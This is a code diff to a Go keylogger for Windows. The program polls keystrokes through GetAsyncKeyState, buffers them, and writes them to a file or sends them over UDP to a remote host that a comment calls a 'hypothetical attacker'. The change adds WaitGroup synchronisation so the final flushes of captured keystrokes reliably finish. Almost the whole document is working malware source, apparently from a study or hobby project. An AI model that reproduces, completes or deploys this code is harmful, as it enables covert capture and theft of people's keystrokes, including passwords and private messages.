@@ -1,12 +1,13 @@
 package main
 
 import (
-	//"fmt"
+	"fmt"
 	"io"
 	"net"
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 )
@@ -149,6 +150,8 @@ var (
 	getState = user32.NewProc("GetAsyncKeyState")
 )
 
+var wg sync.WaitGroup
+
 // represents the keylogger
 type keylogger struct {
 	// true if currently logging, false if not
@@ -224,10 +227,11 @@ func (k *keylogger) start(duration int) {
 		}
 
 		if time.Since(lastBufferFlush) > time.Duration(5)*time.Second {
+			wg.Add(1)
 			if k.mode == 0 {
-				go k.saveToFile(&buffer)
+				go k.saveToFile(&buffer, &wg)
 			} else if k.mode == 1 {
-				go k.sendToHost(&buffer)
+				go k.sendToHost(&buffer, &wg)
 			}
 			lastBufferFlush = time.Now()
 		}
@@ -235,15 +239,18 @@ func (k *keylogger) start(duration int) {
 		prevCurrentKeys = currentKeys
 		time.Sleep(10 * time.Millisecond) // limit logging to every 1/100 second
 	}
-
+	fmt.Println(wg)
 	// do not run these final buffer flushes concurrently or they will not finish before the main function returns
-	if k.mode == 0 {
-		go k.saveToFile(&buffer)
-	} else if k.mode == 1 {
-		go k.sendToHost(&buffer)
+	wg.Wait()
+	if len(buffer) != 0 {
+		wg.Add(1)
+		if k.mode == 0 {
+			k.saveToFile(&buffer, &wg)
+		} else if k.mode == 1 {
+			k.sendToHost(&buffer, &wg)
+		}
 	}
 	k.active = false
-
 }
 
 // returns all the events for when a key is pressed down
@@ -269,7 +276,7 @@ func (k *keylogger) setMode(mode int, info string) {
 }
 
 // save buffer to file
-func (k *keylogger) saveToFile(buffer *[]key) {
+func (k *keylogger) saveToFile(buffer *[]key, wg *sync.WaitGroup) {
 	fmt.Println("Doing a write")
 	downEvents := []key{}
 	for _, key := range *buffer {
@@ -288,10 +295,12 @@ func (k *keylogger) saveToFile(buffer *[]key) {
 	}
 
 	*buffer = nil
+	wg.Done()
 }
 
 // send buffer data to remote host (hypothetical attacker)
-func (k *keylogger) sendToHost(buffer *[]key) {
+func (k *keylogger) sendToHost(buffer *[]key, wg *sync.WaitGroup) {
+	fmt.Println("Starting sendToHost")
 	downEvents := []key{}
 	for _, key := range *buffer {
 		if key.down {
@@ -301,7 +310,6 @@ func (k *keylogger) sendToHost(buffer *[]key) {
 
 	conn, err := net.ListenUDP("udp", &net.UDPAddr{Port: 3333}) // outgoing port
 	check(err)
-	// defer conn.Close() // does doing this shut off the connected?
 
 	// create string representing the keystrokes from the buffer
 	var dataString string = ""
@@ -322,6 +330,8 @@ func (k *keylogger) sendToHost(buffer *[]key) {
 	}
 
 	*buffer = nil
+	wg.Done()
+	fmt.Println("Just ended sendToHost")
 }
 
 // stop running if there is an error
